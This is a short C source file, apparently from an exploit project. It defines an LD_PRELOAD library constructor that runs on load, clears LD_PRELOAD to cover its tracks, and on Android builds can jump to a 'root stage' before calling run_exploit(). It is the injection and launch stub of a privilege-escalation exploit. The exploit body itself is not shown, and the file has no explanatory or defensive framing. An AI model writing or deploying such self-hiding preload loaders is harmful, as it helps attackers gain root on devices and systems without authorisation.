#include "common.h"

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  unsetenv("LD_PRELOAD");

#ifdef ANDROID_TARGET
  if (getenv("ROOT_STAGE")) {
    ghost_mark("preload: root-stage dispatch pid=%d", getpid());
    _exit(do_root_stage());
    return;
  }
#endif

  char *argv[2] = {
    "preload.so",
    NULL,
  };

  ghost_mark("preload: constructor pid=%d", getpid());
  pr_success("preload starting pid=%d target=%s\n", getpid(), BUILD_VARIANT_LABEL);
  run_exploit(1, argv);
}
